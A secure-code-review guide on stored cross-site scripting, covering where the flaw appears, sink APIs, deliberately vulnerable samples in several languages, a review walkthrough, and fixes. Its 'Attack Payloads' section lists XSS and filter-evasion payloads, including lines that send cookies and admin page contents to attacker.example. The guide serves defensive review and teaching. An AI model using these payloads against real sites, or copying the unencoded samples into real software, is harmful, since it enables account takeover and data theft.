---
title: Review Stored XSS
keywords:
  - security code review
  - stored xss
  - cross-site scripting
  - output encoding
  - HTML context
description: How to read code for stored cross-site scripting—trace persisted user input into HTML responses and verify context-appropriate encoding.
---

## 4.1 - Review Stored XSS

Stored cross-site scripting appears when the application saves user input and later renders it in HTML without encoding. Start from persistence (database, cache, file) and follow every read path into templates or DOM updates.

## What This Vulnerability Is

Stored XSS is a client-side injection flaw. The application accepts user input, stores it, and later embeds that value in an HTML response (current page or a later view). If the value is not encoded for HTML, the browser may run attacker-supplied script when another user loads the page.

The unsafe assumption is that stored data is safe to render as markup. This maps to [CWE-79](https://cwe.mitre.org/data/definitions/79.html) (Improper Neutralization of Input During Web Page Generation).

## Vulnerability Characteristics (Where to Identify Them)

| Signal | Where to look |
| --- | --- |
| **Feature type** | Profiles, comments, support tickets, product reviews, admin notes, notification text, searchable stored fields |
| **Input entry** | POST forms, JSON API fields, multipart metadata, background jobs importing user content |
| **Persistence** | SQL/NoSQL columns, object storage, cache keys, session-backed “display name” |
| **HTML sinks** | Server templates, `render_template_string`, email HTML builders, SPA APIs feeding `innerHTML` |
| **Weak controls** | Regex denylist only, `|safe` / `@Html.Raw`, JSP scriptlets, missing auto-escape in templates |
| **High impact views** | Admin dashboards, moderator queues, exports—stored payloads often hit privileged users |

## Attack Payloads

Use these in authorized tests when user input is persisted and later rendered in HTML. Confirm the output context (element body, attribute, script block, URL) before relying on a single payload.

### Pattern 1: Basic script tag (HTML body context)

```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Pattern 2: Event handlers without script tags

```html
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

### Pattern 3: Attribute breakout (when value is quoted)

```html
"><script>alert(1)</script>
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
```

### Pattern 4: JavaScript URL and data URIs

```html
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<object data="data:text/html,<script>alert(1)</script>">
```

### Pattern 5: Filter evasion and encoding variants

```html
<ScRiPt>alert(1)</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=&#97;lert(1)>
```

### Pattern 6: Stored payloads targeting privileged views

```html
<script>fetch('/admin/users').then(r=>r.text()).then(t=>fetch('https://attacker.example/?d='+btoa(t)))</script>
<img src=x onerror="new Image().src='https://attacker.example/?c='+document.cookie">
```

## Language-Specific Sinks and Dangerous APIs

Search for these patterns on every read path from persistence to HTML output. Any API that marks user data as safe HTML or disables auto-escaping is a review priority.

### Python (Flask / Jinja2)

```python
return render_template_string(user_bio)
return Markup(user_comment)
return render_template("profile.html", bio=bio | safe)
env = Environment(autoescape=False)
Template(user_stored_template).render()
```

### Java (JSP / servlets)

```jsp
<%= request.getAttribute("comment") %>
<c:out value="${comment}" escapeXml="false"/>
<div>${userBio}</div>
response.getWriter().write(storedNote);
```

### C# (ASP.NET / Razor)

```csharp
@Html.Raw(Model.UserBio)
return Content(storedHtml, "text/html");
writer.Write(storedComment);  // no encoding
```

### JavaScript (SPA / Node rendering)

```javascript
element.innerHTML = storedComment;
document.write(userBio);
$('#bio').html(storedProfile);
dangerouslySetInnerHTML={{ __html: userBio }}
```

### HTML (email and static builders)

```html
<!-- Server builds HTML email with unencoded stored name -->
<p>Hello, <!-- USER_NAME inserted raw --></p>
<td>{{stored_cell_value}}</td>  <!-- template without escape -->
```

### Go (html/template misuse)

```go
template.HTML(storedBio)  // bypasses auto-escape
fmt.Fprintf(w, "<p>%s</p>", storedComment)  // raw write
```

## Sample Vulnerable Code in Python

```python
from flask import Flask, request, redirect, session

app = Flask(__name__)

@app.route("/profile", methods=["POST"])
def update_profile():
    # Attacker-controlled bio is stored without server-side encoding policy
    bio = request.form["bio"]
    db.execute("UPDATE users SET bio = ? WHERE id = ?", (bio, session["user_id"]))
    return redirect("/profile")

@app.route("/profile")
def show_profile():
    row = db.execute(
        "SELECT bio FROM users WHERE id = ?", (session["user_id"],)
    ).fetchone()
    # Sink: stored value concatenated into HTML — no encoding
    return f"<div class='bio'>{row['bio']}</div>"
```

## Step-by-Step Review Walkthrough

1. **Find write + read pairs.** Search for `INSERT`/`UPDATE` on user-editable fields, then `SELECT` paths that feed HTML. Stored XSS requires both persistence and display.
2. **Trace the Python (or equivalent) write path.** In the sample, `request.form["bio"]` flows straight into SQL. Ask whether any canonicalization runs before storage; storage-time stripping is not a substitute for render-time encoding unless the field is strictly non-HTML forever.
3. **Locate every read path for the same column.** Comments lists, admin tools, email digests, and JSON endpoints may reuse `bio` without the developer noticing.
4. **Inspect the sink in `show_profile`.** The f-string builds HTML. Any stored `<script>` executes in the victim browser. Flag string-built HTML; prefer templates with auto-escape.
5. **Check filters vs encoding.** If you see `bleach.clean` or regex validation, read whether it is allowlist-based and whether output still uses encoding at the template boundary.
6. **Review secondary contexts.** Stored data in `href`, event handlers, `<script type="application/json">`, or Markdown renderers needs context-specific encoding, not only HTML body encoding.
7. **Confirm cross-user impact.** Ask who can view the stored field. Payloads in shared feeds or admin views are often higher severity than self-only profile preview.

## Risk Impact Analysis

**Session and account abuse.** Script in a trusted origin can read non-HttpOnly cookies, perform actions as the victim, or steal anti-CSRF tokens.

**Data and UI integrity.** Attackers can alter visible content, inject fake login forms, or exfiltrate page content to an external host.

**Privilege escalation paths.** Stored XSS in admin-only views is a common path to compromise operators who did not submit the payload.

**Compliance and trust.** Persistent script in customer-facing apps can trigger incident response, breach notification analysis, and reputational harm even when exploitation is limited to a subset of users.

## Vulnerable Examples in Other Languages

### Java

```java
@PostMapping("/comments")
public String addComment(@RequestParam String body) {
    commentRepo.save(new Comment(body, currentUser()));
    return "redirect:/comments";
}

@GetMapping("/comments")
public String listComments(Model model) {
    model.addAttribute("comments", commentRepo.findAll());
    return "comments"; // JSP: ${comment.body} without <c:out>
}
```

### C#

```csharp
[HttpPost]
public IActionResult AddNote(string content) {
    _db.Notes.Add(new Note { Content = content, UserId = UserId });
    _db.SaveChanges();
    return RedirectToAction("Index");
}

public IActionResult Index() {
    var notes = _db.Notes.Where(n => n.UserId == UserId).ToList();
    ViewBag.NotesHtml = string.Join("", notes.Select(n => $"<li>{n.Content}</li>"));
    return View();
}
```

### JavaScript

```javascript
// Stored comment returned from API; SPA renders without encoding
async function postComment(body) {
  await fetch("/api/comments", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ body }),
  });
}

function renderComments(comments) {
  const list = document.getElementById("comments");
  comments.forEach((c) => {
    list.innerHTML += `<p>${c.body}</p>`; // persisted payload executes here
  });
}
```

### HTML

```html
<!-- Thymeleaf: stored note rendered as raw HTML -->
<div class="note" th:utext="${note.content}"></div>

<!-- JSP without JSTL escape -->
<c:forEach var="comment" items="${comments}">
  <div class="comment">${comment.body}</div>
</c:forEach>
```

### Go

```go
func postComment(w http.ResponseWriter, r *http.Request) {
    body := r.FormValue("body")
    db.Exec("INSERT INTO comments (body) VALUES (?)", body)
    http.Redirect(w, r, "/comments", http.StatusSeeOther)
}

func listComments(w http.ResponseWriter, r *http.Request) {
    rows, _ := db.Query("SELECT body FROM comments")
    for rows.Next() {
        var body string
        rows.Scan(&body)
        fmt.Fprintf(w, "<p>%s</p>", body) // no html.EscapeString / template
    }
}
```

## Fix: Safer Patterns and Libraries to Use

### Python

Use templates with auto-escaping enabled. Never mark user content safe unless a vetted sanitizer produced it.

```python
from flask import Flask, render_template
from markupsafe import escape

app = Flask(__name__)
app.jinja_env.autoescape = True  # default in Flask for .html

@app.route("/profile")
def show_profile():
    row = db.execute("SELECT bio FROM users WHERE id = ?", (session["user_id"],)).fetchone()
    return render_template("profile.html", bio=row["bio"])

# Manual encoding when building non-template fragments:
safe_snippet = escape(row["bio"])
```

**Important:** `|safe` in Jinja2 disables escaping. Use only for trusted, server-generated HTML. For rich text, sanitize with an allowlist library before optional `|safe`.

```python
import bleach

ALLOWED_TAGS = ["b", "i", "p", "a"]
ALLOWED_ATTRS = {"a": ["href", "title"]}
clean_bio = bleach.clean(bio, tags=ALLOWED_TAGS, attributes=ALLOWED_ATTRS, strip=True)
```

### Java

Encode at the HTML sink. Prefer JSTL or OWASP Encoder over regex-only input filters.

```jsp
<%@ taglib prefix="c" uri="jakarta.tags.core" %>
<p>Hello <c:out value="${comment.body}" /></p>
```

```java
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(comment.getBody());
model.addAttribute("safeBody", safe);
```

**Important:** Thymeleaf `th:utext` and unescaped JSP scriptlets bypass default protections. Use `th:text` for untrusted data.

### C#

Razor encodes by default. Avoid `Html.Raw` on persisted fields.

```cshtml
@* Safe default encoding *@
<li>@note.Content</li>
```

```csharp
using System.Net;

var encoded = WebUtility.HtmlEncode(note.Content);
ViewBag.SafeLine = $"<li>{encoded}</li>";
```

For controlled HTML subsets, use a maintained sanitizer such as [HtmlSanitizer](https://github.com/mganss/HtmlSanitizer) with an explicit policy.

### Go

Use `html/template`, not `text/template`, for HTML responses.

```go
import "html/template"

var profileTmpl = template.Must(template.New("profile").Parse(
    `<div class="bio">{{.Bio}}</div>`))

func showProfile(w http.ResponseWriter, bio string) {
    profileTmpl.Execute(w, struct{ Bio string }{Bio: bio})
}
```

**Important:** `html.EscapeString` helps only when you must build strings manually; templates apply context-aware rules automatically.

## Verify During Review

- Trace **write → storage → every HTML sink** for the same field.
- Confirm templates use framework auto-escape; no `|safe`, `th:utext`, `@Html.Raw`, or `innerHTML` on untrusted stored data.
- Encoding or vetted sanitization happens at **render time**, not only on input.
- Admin and export views treat stored fields like public views.
- CSP and HttpOnly cookies are defense in depth, not the primary XSS control.

## Reference

- [CWE-79: Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Jinja2 — Controlling autoescaping](https://jinja.palletsprojects.com/en/stable/api/#jinja2.Environment.autoescape)
- [MarkupSafe documentation](https://markupsafe.palletsprojects.com/en/stable/)
- [bleach documentation](https://bleach.readthedocs.io/en/latest/)
- [Python html.escape](https://docs.python.org/3/library/html.html#html.escape)
- [OWASP Java Encoder](https://owasp.org/www-project-java-encoder/)
- [Jakarta Tags — c:out](https://jakarta.ee/specifications/tags/3.0/apidocs/jakarta/tags/core/out)
- [ASP.NET Razor syntax — implicit encoding](https://learn.microsoft.com/en-us/aspnet/core/mvc/views/overview?view=aspnetcore-8.0)
- [WebUtility.HtmlEncode](https://learn.microsoft.com/en-us/dotnet/api/system.net.webutility.htmlencode)
- [Go html/template package](https://pkg.go.dev/html/template)
- [Go html.EscapeString](https://pkg.go.dev/html#EscapeString)
